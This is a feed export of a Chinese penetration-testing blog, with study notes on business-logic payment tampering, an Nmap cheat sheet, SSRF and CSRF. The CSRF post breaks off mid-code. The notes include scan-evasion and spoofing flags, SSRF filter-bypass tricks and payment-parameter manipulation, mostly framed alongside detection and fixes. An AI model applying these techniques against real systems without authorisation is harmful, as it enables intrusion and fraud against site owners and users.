{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"web安全\" category",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/",
            "title": "web漏洞-业务逻辑漏洞",
            "date_published": "2021-03-09T08:15:23.000Z",
            "content_html": "<h1 id=\"找回密码\"><a class=\"anchor\" href=\"#找回密码\">#</a> 找回密码</h1>\n<h1 id=\"支付漏洞\"><a class=\"anchor\" href=\"#支付漏洞\">#</a> 支付漏洞</h1>\n<p>直接改数据包中的金额，金额改动时多试一些值 <code>0.01、1、10、100、……</code></p>\n<p>数量改为 <code>-1</code>  个、 <code>9999999999</code>  超大数、 <code>小数</code> 四舍五入、五舍六入。<br />\n数量不能小于 <code>1</code> ，改为 <code>1.1、1.5、1.6</code> 。<br />\n数据包重放。</p>\n<p>运费的参数</p>\n<p>转账功能 转账金额改为负，别人给自己转钱</p>\n<p>订单号的更改（金额、商品）用便宜的订单去付费贵的商品</p>\n<h1 id=\"越权\"><a class=\"anchor\" href=\"#越权\">#</a> 越权</h1>\n<p>还是找关键参数</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE5NTgzNy5odG1s\">逻辑漏洞挖掘初步总结篇</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWC1jYWlqaS9wLzExMjA5OTYzLmh0bWw=\">Web 安全测试中常见逻辑漏洞解析（实战篇）</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5OTE2OTIvYXJ0aWNsZS9kZXRhaWxzLzgyOTUzMjEz\">常见逻辑漏洞</span></p>\n<p>挖掘出属于自己思维的逻辑漏洞。</p>\n",
            "tags": [
                "业务逻辑漏洞"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/",
            "title": "Nmap速查手册",
            "date_published": "2021-03-09T08:14:20.000Z",
            "content_html": "<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuMmN0by5jb20vQXJ0aWNsZS8yMDE0MTIvMzYyMTg4Lmh0bWw=\">https://www.2cto.com/Article/201412/362188.html</span></p>\n<h1 id=\"nmap-简介\"><a class=\"anchor\" href=\"#nmap-简介\">#</a> Nmap 简介</h1>\n<p>Nmap 是 Network Mapper 的简称<br />\n Nmap 是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具<br />\n 1997 年由 Fyodor 创建</p>\n<p>Nmap 四项基本功能：</p>\n<p>1. 主机发现（Host Discovery）<br />\n2. 端口扫描（Port Scanning）<br />\n3. 版本侦测（Version Detection）<br />\n4. 操作系统侦测（Operating System Detection）</p>\n<p>这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随<br />\n后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基<br />\n础上，Nmap 提供防火墙与 IDS（IntrusionDetection System, 入侵检测系统）的规避技巧，可以综合应用到四个基本功<br />\n能的各个阶段；另外 Nmap 提供强大的 NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充<br />\n和扩展。</p>\n<p><span class=\"label info\">大致功能为:</span></p>\n<ol>\n<li>主机存活检测</li>\n<li>端口探测</li>\n<li>服务识别</li>\n<li>操作系统识别</li>\n<li>硬件地址检测</li>\n<li>服务版本识别</li>\n<li>漏洞扫描，使用 nmap 自带脚本</li>\n</ol>\n<h1 id=\"nmap参数详解\"><a class=\"anchor\" href=\"#nmap参数详解\">#</a> Nmap 参数详解</h1>\n<h2 id=\"nmap支持主机名ip网段的表示方式\"><a class=\"anchor\" href=\"#nmap支持主机名ip网段的表示方式\">#</a> Nmap 支持主机名，ip, 网段的表示方式</h2>\n<p>例如:blah.highon.coffee, <span class=\"exturl\" data-url=\"aHR0cDovL25hbXAub3JnLzI0\">namp.org/24</span>, 192.168.0.1;10.0.0-25.1-254</p>\n<p>-iL filename                    从文件中读取待检测的目标，文件中的表示方法支持机名，ip, 网段<br />\n - iR hostnum                     随机选取，进行扫描。如果 - iR 指定为 0, 则是无休止的扫描<br />\n --exclude host1 [, host2]        从扫描任务中需要排除的主机<br />\n --exculdefile exclude_file      排除文件中的 IP, 格式和 - iL 指定扫描文件的格式相同</p>\n<h2 id=\"0x00-主机发现\"><a class=\"anchor\" href=\"#0x00-主机发现\">#</a> 0x00 主机发现</h2>\n<p>-sL                     仅仅是显示，扫描的 IP 数目，不会进行任何扫描<br />\n - sn                     ping 扫描，即主机发现<br />\n - Pn                     不检测主机存活<br />\n - PS/PA/PU/PY [portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping 发现<br />\n - PE/PP/PM               使用 ICMP echo, timestamp and netmask 请求包发现主机<br />\n - PO [prococol list]      使用 IP 协议包探测对方主机是否开启<br />\n - n/-R                   不对 IP 进行域名反向解析 / 为所有的 IP 都进行域名的反响解析</p>\n<h2 id=\"0x01-扫描技巧\"><a class=\"anchor\" href=\"#0x01-扫描技巧\">#</a> 0x01 扫描技巧</h2>\n<p>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect ()/ACK/TCP 窗口扫描 / TCP Maimon 扫描<br />\n - sU                             UDP 扫描<br />\n - sN/sF/sX                       TCP Null，FIN，and Xmas 扫描<br />\n --scanflags                     自定义 TCP 包中的 flags<br />\n-sI zombie host[:probeport]     Idlescan<br />\n-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描<br />\n - sO                             使用 IP protocol 扫描确定目标机支持的协议类型<br />\n - b “FTP relay host” 使用 FTP bounce scan</p>\n<h2 id=\"0x02-指定端口和扫描顺序\"><a class=\"anchor\" href=\"#0x02-指定端口和扫描顺序\">#</a> 0x02 指定端口和扫描顺序</h2>\n<p>-p                      特定的端口 -p80,443 或者 -p1-65535<br />\n-p U:PORT               扫描 udp 的某个端口，-p U:53<br />\n-F                      快速扫描模式，比默认的扫描端口还少<br />\n - r                      不随机扫描端口，默认是随机扫描的<br />\n --top-ports &quot;number&quot;    扫描开放概率最高的 number 个端口，出现的概率需要参考 nmap-services 文件，ubuntu 中该文件位于 /usr/share/nmap.nmap 默认扫前 1000 个<br />\n --port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</p>\n<h2 id=\"0x03-服务版本识别\"><a class=\"anchor\" href=\"#0x03-服务版本识别\">#</a> 0x03 服务版本识别</h2>\n<p>-sV                             开放版本探测，可以直接使用 - A 同时打开操作系统探测和版本探测<br />\n --version-intensity &quot;level&quot;     设置版本扫描强度，强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是 7<br />\n--version-light                 打开轻量级模式，为 --version-intensity 2 的别名<br />\n --version-all                   尝试所有探测，为 --version-intensity 9 的别名<br />\n --version-trace                 显示出详细的版本侦测过程信息</p>\n<h2 id=\"0x04-脚本扫描\"><a class=\"anchor\" href=\"#0x04-脚本扫描\">#</a> 0x04 脚本扫描</h2>\n<p>-sC                             根据端口识别的服务，调用默认脚本<br />\n --script=”Lua scripts”          调用的脚本名<br />\n --script-args=n1=v1,[n2=v2]     调用的脚本传递的参数<br />\n --script-args-file=filename     使用文本传递参数<br />\n --script-trace                  显示所有发送和接收到的数据<br />\n --script-updatedb               更新脚本的数据库<br />\n --script-help=”Lua script”      显示指定脚本的帮助</p>\n<h2 id=\"0x05-os识别\"><a class=\"anchor\" href=\"#0x05-os识别\">#</a> 0x05 OS 识别</h2>\n<p>-O              启用操作系统检测，-A 来同时启用操作系统检测和版本检测<br />\n --osscan-limit  针对指定的目标进行操作系统检测 (至少需确知该主机分别有一个 open 和 closed 的端口)<br />\n--osscan-guess  推测操作系统检测结果，当 Nmap 无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap 默认进行这种匹配</p>\n<h2 id=\"0x06-防火墙ids躲避和欺骗\"><a class=\"anchor\" href=\"#0x06-防火墙ids躲避和欺骗\">#</a> 0x06 防火墙 / IDS 躲避和欺骗</h2>\n<p>-f; --mtu value                 指定使用分片、指定数据包的 MTU.<br />\n-D decoy1,decoy2,ME             使用诱饵隐蔽扫描<br />\n - S IP-ADDRESS                   源地址欺骗<br />\n - e interface                    使用指定的接口<br />\n - g/--source-port PROTNUM       使用指定源端口<br />\n --proxies url1,[url2],...       使用 HTTP 或者 SOCKS4 的代理</p>\n<p>--data-length NUM               填充随机数据让数据包长度达到 NUM<br />\n--ip-options OPTIONS            使用指定的 IP 选项来发送数据包<br />\n --ttl VALUE                     设置 IP time-to-live 域<br />\n --spoof-mac ADDR/PREFIX/VEBDOR  MAC 地址伪装<br />\n --badsum                        使用错误的 checksum 来发送数据包</p>\n<h2 id=\"0x07-输出\"><a class=\"anchor\" href=\"#0x07-输出\">#</a> 0x07 输出</h2>\n<p>-oN                     将标准输出直接写入指定的文件<br />\n - oX                     输出 xml 文件<br />\n - oS                     将所有的输出都改为大写<br />\n - oG                     输出便于通过 bash 或者 perl 处理的格式，非 xml<br />\n-oA BASENAME            可将扫描结果以标准格式、XML 格式和 Grep 格式一次性输出<br />\n - v                      提高输出信息的详细度<br />\n - d level                设置 debug 级别，最高是 9<br />\n--reason                显示端口处于带确认状态的原因<br />\n --open                  只输出端口状态为 open 的端口<br />\n --packet-trace          显示所有发送或者接收到的数据包<br />\n --iflist                显示路由信息和接口，便于调试<br />\n --log-errors            把日志等级为 errors/warings 的日志输出<br />\n --append-output         追加到指定的文件<br />\n --resume FILENAME       恢复已停止的扫描<br />\n --stylesheet PATH/URL   设置 XSL 样式表，转换 XML 输出<br />\n --webxml                从 namp.org 得到 XML 的样式<br />\n --no-sytlesheet         忽略 XML 声明的 XSL 样式表</p>\n<h2 id=\"0x08-其他选项\"><a class=\"anchor\" href=\"#0x08-其他选项\">#</a> 0x08 其他选项</h2>\n<p>-6                      开启 IPv6<br />\n-A                      OS 识别，版本探测，脚本扫描和 traceroute<br />\n--datedir DIRNAME       说明用户 Nmap 数据文件位置<br />\n --send-eth /--send-ip  使用原以太网帧发送 / 在原 IP 层发送<br />\n --privileged            假定用户具有全部权限<br />\n --unprovoleged          假定用户不具有全部权限，创建原始套接字需要 root 权限<br />\n - V                      打印版本信息<br />\n - h                      输出帮助</p>\n<h1 id=\"nmap-例子\"><a class=\"anchor\" href=\"#nmap-例子\">#</a> nmap 例子</h1>\n<p>使用 ping 检测 10.0.0.0/24 这个网段</p>\n<p><code>nmap -sP 10.0.0.0/24</code></p>\n<p>使用 SYN 的方法对全端口进行扫描，在 aggressive (4) 的时间模板下，同时对开放的端口进行端口识别</p>\n<p><code>nmap -p1-65535 -sV -sS -T4 target</code></p>\n<p>PS: -T 代表的是扫描的时候，一些控制选项 (TCP 的延迟时间，探测报文之间的间隔等) 的集合，具体的 man nmap 一下就知道了</p>\n<p>使用 SYN 扫描，在 aggressive (4) 的时间模板下，探测操作系统的类型和版本，还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -sS -A -T4 target</code></p>\n<p>使用 SYN 扫描，在 insane (5) 的时间模板下，探测操作系统的类型和版本，还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -sS -A -T5 target</code></p>\n<p>使用 SYN 扫描，在 insane (5) 的时间模板下，探测操作系统的类型，还有显示 traceroute 的结果，操作系统的类型，结果输出较为详细</p>\n<p><code>nmap -v -sV -O -sS -T5 target</code></p>\n<p>使用 SYN 的方法对全端口进行扫描，同时对开放的端口进行端口识别，在 aggressive (4) 的时间模板下，探测操作系统的类型还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -p 1-65535 -sV -O -sS -T4 target</code></p>\n<p>用 SYN 的方法对全端口进行扫描，同时对开放的端口进行端口识别，在 insane (5) 的时间模板下，探测操作系统的类型，还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -p 1-65535 -sV -O -sS -T5 target</code></p>\n<p>从文件中读取需要扫描的 IP 列表</p>\n<p><code>nmap -iL ip-address.txt</code></p>\n<p>Nmap 输出格式</p>\n<ol>\n<li>扫描的结果输出到屏幕，同时会存储一份到 grep-output.txt</li>\n</ol>\n<p><code>nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24</code></p>\n<ol start=\"2\">\n<li>扫描结果输出为 html</li>\n</ol>\n<p><code>nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html</code></p>\n<p>Nmap 扫描 Netbios</p>\n<ol>\n<li>在子网中发现开放 netbios 的 IP</li>\n</ol>\n<p><code>nmap -sV -v -p139,445 10.0.0.1/24</code></p>\n<ol start=\"2\">\n<li>扫描指定 netbios 的名称</li>\n</ol>\n<p><code>nmap -sU --script nbstat.nse -p 137 target</code></p>\n<p>扫描指定的目标，同时检测相关漏洞</p>\n<p><code>nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</code></p>\n<p>将 nmap 的 80 端口的扫描结果，通过管道交给 nikto 进行扫描</p>\n<p><code>Nmap Nikto Scan nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -</code></p>\n<p>将 nmap 的 80,443 端口的扫描结果，通过管道交给 nikto 进行扫描</p>\n<p><code>nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -</code></p>\n",
            "tags": [
                "Nmap"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/",
            "title": "初学webshell检测",
            "date_published": "2021-03-02T09:51:07.000Z",
            "content_html": "<h1 id=\"webshell-流量特征\"><a class=\"anchor\" href=\"#webshell-流量特征\">#</a> WebShell 流量特征</h1>\n",
            "tags": [
                "webshell流量特征"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-SSRF/",
            "title": "web漏洞-SSRF",
            "date_published": "2021-02-01T11:54:22.000Z",
            "content_html": "<h1 id=\"ssrf的定义与成因\"><a class=\"anchor\" href=\"#ssrf的定义与成因\">#</a> SSRF 的定义与成因</h1>\n<p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>\n<p>注释：除了 http/https 等方式可以造成 ssrf，类似 tcp connect 方式也可以探测内网一些 ip 的端口是否开发服务，只不过危害比较小而已。</p>\n<h1 id=\"可能出现的地方\"><a class=\"anchor\" href=\"#可能出现的地方\">#</a> 可能出现的地方</h1>\n<p>1. 社交分享功能：获取超链接的标题等内容进行显示</p>\n<p>2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n<p>3. 在线翻译：给网址翻译对应网页的内容</p>\n<p>4. 图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片</p>\n<p>5. 图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验</p>\n<p>6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试</p>\n<p>7. 网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作</p>\n<p>8. 数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数</p>\n<p>9. 邮件系统：比如接收邮件服务器地址</p>\n<p>10. 编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等</p>\n<p>11. 未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞</p>\n<p>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>\n<p>12. 从远程服务器请求资源（upload from url 如 discuz！；import &amp; expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）</p>\n<h1 id=\"漏洞验证\"><a class=\"anchor\" href=\"#漏洞验证\">#</a> 漏洞验证</h1>\n<p>1. 排除法：浏览器 f12 查看源代码看是否是在本地进行了请求</p>\n<p>比如：该资源地址类型为  <code>http://www.xxx.com/a.php?image=（地址）</code> 的就可能存在 SSRF 漏洞</p>\n<p>2.dnslog 等工具进行测试，看是否被访问</p>\n<p>-- 可以在盲打后台用例中将当前准备请求的 uri 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求。</p>\n<p>3. 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在 HTTP 服务的内网地址</p>\n<p>-- 从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址</p>\n<p>-- 通过二级域名暴力猜解工具模糊猜测内网地址</p>\n<p>4. 直接返回的 Banner、title、content 等信息</p>\n<p>5. 留意 bool 型 SSRF</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<p>1. 让服务端去访问相应的网址</p>\n<p>2. 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的 cms</p>\n<p>3. 可以使用 file、dict、gopher [11]、ftp 协议进行请求访问相应的文件</p>\n<p>4. 攻击内网 web 应用（可以向内部任意主机的任意端口发送精心构造的数据包 {payload}）</p>\n<p>5. 攻击内网应用程序（利用跨协议通信技术）</p>\n<p>6. 判断内网主机是否存活：方法是访问看是否有端口开放</p>\n<p>7.DoS 攻击（请求大文件，始终保持连接 keep-alive always）</p>\n<h1 id=\"绕过限制方法\"><a class=\"anchor\" href=\"#绕过限制方法\">#</a> 绕过限制方法</h1>\n<p>详细绕过参考 -----&gt;<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n<p>1. <code>http://xxxx.com@www.baidu.com/</code>  与 <code>http://www.baidu.com/</code>  请求时是相同的</p>\n<p>2. 各种 IP 地址的进制转换</p>\n<p>可以是十六进制，八进制等。<br />\n115.239.210.26  &gt;&gt;&gt;  16373751032<br />\n 首先把这四段数字给分别转成 16 进制，结果：73 ef d2 1a<br />\n 然后把 73efd21a 这十六进制一起转换成 8 进制<br />\n记得访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0 跟 XSS 中多加几个 0 来绕过过滤一样)，十六进制加 0x</p>\n<p>127.0.0.1 =&gt; 2130706433<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>3.URL 跳转绕过： <code>http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</code></p>\n<p>4. 短网址绕过  <code>http://t.cn/RwbLKDx</code></p>\n<p>短网址原理请参考<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy52ZXJ5aXRtYW4uY29tLzIwMTkvMTEvMjQvJUU3JTlGJUFEJUU1JTlDJUIwJUU1JTlEJTgwJUU1JThFJTlGJUU3JTkwJTg2Lw==\"> http://www.veryitman.com/2019/11/24 / 短地址原理 /</span></p>\n<p>5.xip.io 来绕过： <code>http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）</code></p>\n<p>指向任意 ip 的域名：<span class=\"exturl\" data-url=\"aHR0cDovL3hpcC5pbw==\">xip.io</span> (37signals 开发实现的定制 DNS 服务)</p>\n<p>6. 限制了子网段，可以加 :80 端口绕过。 <code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</code></p>\n<p>7. 探测内网域名，或者将自己的域名解析到内网 ip</p>\n<p>8. 例如  <code>http://10.153.138.81/ts.php</code>  , 修复时容易出现的获取 host 时以 / 分割来确定 host，</p>\n<p>但这样可以用  <code>http://abc@10.153.138.81/</code>  绕过</p>\n<p>9. 利用 Enclosed alphanumerics</p>\n<pre><code class=\"language-txt\">利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n</code></pre>\n<h1 id=\"漏洞示例\"><a class=\"anchor\" href=\"#漏洞示例\">#</a> 漏洞示例</h1>\n<p>1.Wordpress3.5.1 以下版本 xmlrpc.php pingback 的缺陷与 ssrf</p>\n<p>2.discuz！的 ssrf （利用 php 的 header 函数来绕过，其实就是 302 跳转实现协议转换）</p>\n<p>3.weblogic 的 ssrf</p>\n<p>.....</p>\n<h1 id=\"漏洞修复\"><a class=\"anchor\" href=\"#漏洞修复\">#</a> 漏洞修复</h1>\n<p>1. 禁止跳转</p>\n<p>2. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>3. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题</p>\n<p>4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname () 判断是否为内网 IP）</p>\n<p>5. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090</p>\n<p>6. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjExNQ==\">https://xz.aliyun.com/t/2115</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9sZWFybmluZy9kZXRhaWwvMjQwLmh0bWw=\">http://bobao.360.cn/learning/detail/240.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n",
            "tags": [
                "SSRF"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "title": "web漏洞-CSRF",
            "date_published": "2021-02-01T11:53:47.000Z",
            "content_html": "<h1 id=\"csrf概念\"><a class=\"anchor\" href=\"#csrf概念\">#</a> CSRF 概念</h1>\n<p>CSRF 跨站点请求伪造 (Cross—Site Request Forgery)，跟 XSS 攻击一样，存在巨大的危害性，你可以这样来理解：</p>\n<blockquote>\n<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中 Web A 为存在 CSRF 漏洞的网站，Web B 为攻击者构建的恶意网站，User C 为 Web A 网站的合法用户。尽管听起来跟 XSS 跨站脚本攻击有点相似，但事实上 CSRF 与 XSS 差别很大，XSS 利用的是站点内的信任用户，而 CSRF 则是通过伪装来自受信任用户的请求来利用受信任的网站。</p>\n</blockquote>\n<h1 id=\"csrf攻击示意图\"><a class=\"anchor\" href=\"#csrf攻击示意图\">#</a> CSRF 攻击示意图</h1>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>首先用户 C 浏览并登录了受信任站点 A；<br />\n登录信息验证通过以后，站点 A 会在返回给浏览器的信息中带上已登录的 cookie，cookie 信息会在浏览器端保存一定时间（根据服务端设置而定）；<br />\n完成这一步以后，用户在没有登出（清除站点 A 的 cookie）站点 A 的情况下，访问恶意站点 B；<br />\n这时恶意站点 B 的某个页面向站点 A 发起请求，而这个请求会带上浏览器端所保存的站点 A 的 cookie；<br />\n站点 A 根据请求所带的 cookie，判断此请求为用户 C 所发送的。<br />\n因此，站点 A 会报据用户 C 的权限来处理恶意站点 B 所发起的请求，而这个请求可能以用户 C 的身份发送 邮件、短信、消息，以及进行转账支付等操作，这样恶意站点 B 就达到了伪造用户 C 请求站点 A 的目的。<br />\n受害者只需要做下面两件事情，攻击者就能够完成 CSRF 攻击：</p>\n<ol>\n<li>登录受信任站点 A，并在本地生成 cookie；</li>\n<li>在不登出站点 A（清除站点 A 的 cookie）的情况下，访问恶意站点 B。</li>\n</ol>\n<p>很多情况下所谓的恶意站点，很有可能是一个存在其他漏洞（如 XSS）的受信任且被很多人访问的站点，这样，普通用户可能在不知不觉中便成为了受害者。</p>\n<h1 id=\"csrf漏洞检测\"><a class=\"anchor\" href=\"#csrf漏洞检测\">#</a> CSRF 漏洞检测：</h1>\n<p>检测 CSRF 漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>\n<p>随着对 CSRF 漏洞研究的不断深入，不断涌现出一些专门针对 CSRF 漏洞进行检测的工具，如 CSRFTester，CSRF Request Builder 等。</p>\n<p>以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n<p>客户端访问服务器时没有同服务器做安全验证</p>\n<p>一切 http 参数可控</p>\n<p>详细 CSRF 检测见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTAxMTIyL2FydGljbGUvZGV0YWlscy8xMDY0MDg3MTQ=\"> https://blog.csdn.net/qq_41901122/article/details/106408714</span></p>\n<h1 id=\"防御csrf攻击\"><a class=\"anchor\" href=\"#防御csrf攻击\">#</a> 防御 CSRF 攻击</h1>\n<h2 id=\"尽量使用post限制get\"><a class=\"anchor\" href=\"#尽量使用post限制get\">#</a> 尽量使用 POST，限制 GET</h2>\n<p>GET 接口太容易被拿来做 CSRF 攻击，看上面示例就知道，只要构造一个 img 标签，而 img 标签又是不能过滤的数据。接口最好限制为 POST 使用，GET 则无效，降低攻击风险。<br />\n当然 POST 并不是万无一失，攻击者只要构造一个 form 就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p>\n<h2 id=\"将cookie设置为httponly\"><a class=\"anchor\" href=\"#将cookie设置为httponly\">#</a> 将 cookie 设置为 HttpOnly</h2>\n<p>CRSF 攻击很大程度上是利用了浏览器的 cookie，为了防止站内的 XSS 漏洞盗取 cookie, 需要在 cookie 中设置 “HttpOnly” 属性，这样通过程序（如 JavaScript 脚本、Applet 等）就无法读取到 cookie 信息，避免了攻击者伪造 cookie 的情况出现。<br />\n在 Java 的 Servlet 的 API 中设置 cookie 为 HttpOnly 的代码如下：<br />\n <code>response.setHeader( &quot;Set-Cookie&quot;, 